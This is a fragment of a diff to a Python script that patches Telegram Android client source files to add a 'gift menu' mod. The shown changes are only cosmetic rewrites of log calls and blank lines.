         log("ERROR: TMessagesProj не найден")
         return 1
-
     write(MOD_PATH, build_java())
-    log("GiftMenuMod.java OK — @%s, login UI 1x" % CATALOG_USERNAME)
-
+    log("GiftMenuMod.java OK")
     al = find_java("ApplicationLoader.java")
     if al:
-        log(f"patch {al.name}")
+        log("patch " + al.name)
         patch_file(al, patch_application_loader)
-
     la = find_java("LaunchActivity.java")
     if la:
-        log(f"patch {la.name}")
+        log("patch " + la.name)
         patch_file(la, patch_launch)
-
     for name in ("LoginActivity.java", "IntroActivity.java"):
         p = find_java(name)
         if p:
-            log(f"patch {p.name}")
+            log("patch " + p.name)
             patch_file(p, patch_login_like)
-
     d = find_java("DialogsActivity.java")
     if d:
-        log(f"patch {d.name}")
+        log("patch " + d.name)
         patch_file(d, patch_dialogs)
-
     gs = find_java("GiftSheet.java")
     if gs:
-        log(f"patch {gs.name}")
+        log("patch " + gs.name)
         patch_file(gs, patch_gift_sheet)
-
     log("DONE")
     return 0
-
 
 if __name__ == "__main__":
     sys.exit(main())
